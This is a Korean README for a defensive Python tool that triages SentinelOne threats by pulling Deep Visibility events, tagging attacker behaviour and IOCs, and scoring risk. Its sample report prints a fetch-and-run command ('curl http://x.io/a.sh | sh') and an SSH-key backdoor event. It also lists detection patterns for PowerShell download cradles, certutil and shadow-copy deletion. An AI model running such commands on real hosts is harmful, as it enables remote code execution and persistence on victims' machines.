# s1api: SentinelOne Deep Visibility 자동 트리아지

SentinelOne 콘솔에서 미해결 위협(Threat)이 새로 생기면 해당 위협의 **Storyline ID** 로 Deep Visibility(DV) 이벤트를 자동 조회하고, LOLBin/의심 명령줄 탐지, IOC(IP·도메인·해시) 추출, 선택적 위협 인텔리전스(VirusTotal / AbuseIPDB) 조회까지 수행한 뒤 위험도와 함께 리포트를 출력하는 Python 데몬입니다.

```
[ SentinelOne 콘솔 ]
      │  GET /threats (미해결, 최신순, 주기적 폴링)
      ▼
[ 신규 위협 선별 ]  ← state/seen_threats.json 으로 중복 분석 방지
      │  POST /dv/init-query  (storyline = "<ID>")
      │  GET  /dv/query-status (완료까지 대기)
      │  GET  /dv/events       (nextCursor 페이지네이션)
      ▼
[ 분석 ]  행위 설명(타임라인·요약), LOLBin·명령줄 패턴(MITRE ATT&CK), IOC 추출
      ▼
[ Enrichment ]  VirusTotal / AbuseIPDB (API 키가 있을 때만)
      ▼
[ 리포트 ]  콘솔 출력 + reports/threat_<ID>.json
```

## 빠른 시작

```bash
python -m venv .venv && source .venv/bin/activate
pip install -r requirements.txt

cp .env.example .env
# .env 에 S1_API_URL, S1_API_TOKEN 입력

python -m s1triage                 # 데몬 모드 (기본 30초 주기)
python -m s1triage --once          # 한 번만 폴링
python -m s1triage --skip-backlog  # 기존 미해결 위협은 건너뛰고 이후 신규만 분석
python -m s1triage --threat-id 1234567890   # 특정 위협 1건만 분석
python -m s1triage --web           # 모니터링 + 웹 화면 (브라우저가 자동으로 열림)
python -m s1triage --web-only      # 모니터링 없이 저장된 리포트만 웹으로 보기
```

## 웹 화면

`python -m s1triage --web` 을 실행하면 모니터링을 하면서 http://127.0.0.1:8080/ 에 웹 화면이 열립니다.

- 왼쪽: 분석된 위협 목록 (최신순, 위험도 배지, 호스트, 주목할 행위). 위험도 필터와 검색 지원.
- 오른쪽: 선택한 위협의 상세. 위협 정보, 행위 요약, 주목할 행위 설명(의미 + 근거 이벤트), 행위 타임라인, 의심 프로세스, IOC, 위협 인텔리전스.
- 15초마다 자동 새로고침되고, 상단에 마지막 조회 시각과 오류 여부가 표시됩니다.
- 화면은 `reports/` 폴더의 JSON 리포트를 읽어서 보여줍니다. `--web` 이면 `REPORT_DIR` 이 비어 있어도 `reports` 에 저장합니다.
- 외부 라이브러리나 인터넷 연결 없이 동작하고, 기본으로 `127.0.0.1` 에만 열려 **이 PC 에서만** 접속할 수 있습니다. 인증 기능이 없으므로 `WEB_HOST=0.0.0.0` 으로 바꿔 다른 PC 에 공개하지 마세요.
- 포트가 이미 쓰이고 있으면 `--port 8081` 처럼 바꿔서 실행하세요.

> ⚠️ API 토큰은 절대 코드나 Git 에 넣지 마세요. `.env` 는 `.gitignore` 에 포함되어 있습니다. 토큰이 채팅·코드 등에 노출된 적이 있다면 콘솔에서 재발급(rotate)하는 것을 권장합니다.

### 필요한 API 권한
서비스 유저(Viewer 이상)에 다음 권한이 필요합니다: Threats 조회, Deep Visibility 쿼리.

## 설정 (환경변수)

| 변수 | 기본값 | 설명 |
|---|---|---|
| `S1_API_URL` | (필수) | 예: `https://<console>.sentinelone.net/web/api/v2.1` |
| `S1_API_TOKEN` | (필수) | SentinelOne API 토큰 |
| `S1_POLL_INTERVAL` | 30 | 위협 폴링 주기(초) |
| `S1_THREAT_FETCH_LIMIT` | 20 | 폴링당 가져올 미해결 위협 수 |
| `S1_STATE_FILE` | `state/seen_threats.json` | 처리한 위협 ID 저장 위치 |
| `S1_DV_LOOKBACK_HOURS` | 24 | DV 조회 범위: 위협 생성 시각 − N시간 ~ 현재 |
| `S1_DV_QUERY_TEMPLATE` | `storyline = "{storyline_id}"` | S1QL 템플릿 |
| `S1_DV_POLL_SECONDS` / `S1_DV_TIMEOUT_SECONDS` | 3 / 90 | 쿼리 상태 확인 간격 / 최대 대기 |
| `S1_DV_MAX_EVENTS` | 5000 | 위협당 수집할 최대 이벤트 수 |
| `S1_HTTP_TIMEOUT` / `S1_HTTP_RETRIES` | 30 / 3 | HTTP 타임아웃, 5xx 재시도 횟수 |
| `S1_RATE_LIMIT_RETRIES` | 4 | 429 응답 시 재시도 횟수 (Retry-After 준수, 없으면 15→30→60→120초 대기) |
| `S1_DV_MIN_INTERVAL` | 10 | DV 쿼리 연속 생성 시 최소 간격(초) |
| `VT_API_KEY` | (선택) | VirusTotal v3 키: 해시·IP·도메인 조회 |
| `ABUSEIPDB_API_KEY` | (선택) | AbuseIPDB 키: IP 평판 조회 |
| `ENRICH_MAX_LOOKUPS` | 10 | 위협 1건당 TI 조회 상한 (무료 쿼터 보호) |
| `REPORT_DIR` | (비움) | JSON 리포트 저장 디렉터리 |
| `WEB_HOST` / `WEB_PORT` | 127.0.0.1 / 8080 | 웹 화면 주소 |
| `REPORT_RAW_EVENTS` | false | true 면 JSON 리포트에 DV 원본 이벤트 포함 (필드명 확인·룰 튜닝용) |

## 행위 분석 (무엇을 했는지 설명)

DV 이벤트 하나하나를 "어떤 프로세스가 무엇을 했는지" 한 줄로 풀어 쓰고, 위험한 행위에는 그 의미를 설명합니다.

```
[행위 분석]
· 주요 행위 주체는 bash(부모: sshd), 함께 등장한 프로세스: curl.
· 총 5개 이벤트 (...): 프로세스 실행 1건, 파일 수정 2건, 로그인 2건.
· 주목할 행위: SSH 키 등록(백도어), 다운로드 즉시 실행, 외부 파일 다운로드, 로그인 실패.
주목할 행위 설명:
  ▶ SSH 키 등록(백도어) [T1098.004]
    의미: 공격자가 자신의 SSH 공개키를 넣어 비밀번호 없이 다시 접속할 수 있게 만드는 대표적인 지속성 수법입니다.
    근거: [bash] 파일 수정: /root/.ssh/authorized_keys
행위 타임라인 (시간순, 같은 행위는 묶음):
  04:52:51  사용자 root 로그인 실패 (출발지 45.1.2.3) ×2 ⚠
  04:52:53  [bash] curl 실행 (명령: curl http://x.io/a.sh | sh) ⚠
  04:52:54  [bash] 파일 수정: /root/.ssh/authorized_keys ⚠
```

- 지원 이벤트: 프로세스 실행, 파일 생성/수정/삭제/이름변경, 네트워크 연결/리슨, DNS, URL, 레지스트리, 로그인/로그아웃, 예약 작업, 프로세스 핸들 접근, 스크립트, 모듈/드라이버 로드, SentinelOne 행위 지표. 그 외 유형도 "[프로세스] 유형 이벤트" 형태로 표시됩니다.
- 위험 행위 태그: SSH 키 등록, 계정/sudoers 변경, cron·systemd·셸 시작 스크립트 등 지속성, 로그·명령 기록 삭제, 임시 폴더 실행, 다운로드 후 즉시 실행, 리버스 셸, 정찰 명령, 계정 생성, 자동 실행 레지스트리, 보안 설정 변경, LSASS 접근, 의심 포트 통신 등.
- 정상 동작 오탐 줄이기: sshd·rsyslogd 같은 데몬이 `/var/log` 에 기록하는 것은 흔적 삭제로 보지 않고(삭제·이름변경이나 셸/일반 도구로 고친 경우만 해당), systemd 가 띄운 `sshd -D` 데몬 자체는 의심 프로세스로 보지 않습니다.
- 규칙은 `s1triage/behavior.py` 의 `PATH_RULES`, `REGISTRY_RULES`, `CMD_RULES` 에 정규식으로 정의되어 있어 쉽게 추가할 수 있습니다.

## 프로토타입 대비 변경 사항

- **비밀값 분리**: URL/토큰을 `.env`(환경변수)로 이동, `Settings` 의 repr 에서 토큰 마스킹.
- **중복 방지 개선**: 최신 1건만 보던 방식 → 최신 N건을 가져와 아직 처리하지 않은 위협을 오래된 순으로 모두 분석. 처리 이력은 파일에 저장되어 재시작해도 유지됩니다. DV 조회가 실패한 위협은 다음 폴링에서 재시도합니다.
- **DV 결과 페이지네이션**: `/dv/events` 의 `nextCursor` 를 따라 전체 결과를 수집(상한 `S1_DV_MAX_EVENTS`). 기존에는 첫 페이지만 가져왔습니다.
- **조회 범위**: "현재 − 24시간" 고정 → "위협 생성 시각 − 24시간 ~ 현재". 오래된 위협도 빠짐없이 조회합니다.
- **쿼리 상태**: `isFinished` 외에 `responseState`(FINISHED/FAILED 등)도 확인해 실패 시 즉시 중단.
- **재시도/레이트리밋**: 5xx 지수 백오프 재시도, 429 는 더 길게 대기 후 재시도, DV 쿼리 사이 최소 간격, 모든 요청에 타임아웃.
- **LOLBin 오탐 수정**: 부분 문자열 매칭(`"nc" in name`) 때문에 `sync.exe`, `vncviewer.exe`, `cmdagent.exe` 등이 탐지되던 문제를, 경로·확장자를 제거한 프로세스 이름 **정확 일치**로 수정. 탐지 목록 확장 및 MITRE ATT&CK 기법 ID·가중치 부여.
- **명령줄 패턴 탐지**: 인코딩된 PowerShell, `IEX + DownloadString`, `certutil -urlcache`, `vssadmin delete shadows`, 숨김 창 실행.
- **IOC 추출**: 공인 IP(사설·예약 대역 제외), 도메인(DNS·URL·명령줄 내 URL), SHA1/SHA256/MD5.
- **위험도 점수**: 탐지 가중치 + TI 악성 판정 + 콘솔 신뢰도로 LOW / MEDIUM / HIGH 산정.

## 프로젝트 구조

```
s1triage/
  config.py      환경변수/.env 로딩
  client.py      SentinelOne API (threats, dv/init-query, query-status, events)
  analyzer.py    LOLBin·명령줄 탐지, IOC 추출
  behavior.py    행위 설명 문장, 위험 행위 태그, 타임라인/요약
  enrichment.py  VirusTotal / AbuseIPDB
  state.py       처리한 위협 ID 저장
  report.py      위험도 산정, 콘솔/JSON 리포트
  monitor.py     파이프라인 + CLI
  web.py         로컬 웹 화면 서버 (static/index.html)
tests/           가짜 HTTP 응답 기반 단위 테스트
```

## 테스트

```bash
pip install -r requirements-dev.txt
python -m pytest -q
```

테스트는 실제 SentinelOne 에 접속하지 않고 가짜 응답으로 동작합니다.

## 참고 / 다음 단계

- DV 이벤트 필드명은 콘솔 버전에 따라 다를 수 있어 `analyzer.py` 에서 여러 후보 키(`tgtProcName`, `processName`, `srcProcName` 등)를 순서대로 확인합니다. 실제 응답에서 다른 키가 보이면 해당 목록에 추가하세요.
- 확장 아이디어: Slack/Teams/Jira 알림, Webhook 수신 모드, HIGH 등급 시 에이전트 네트워크 격리(`POST /agents/actions/disconnect`) 자동화(오탐 위험이 있으므로 승인 단계 권장).
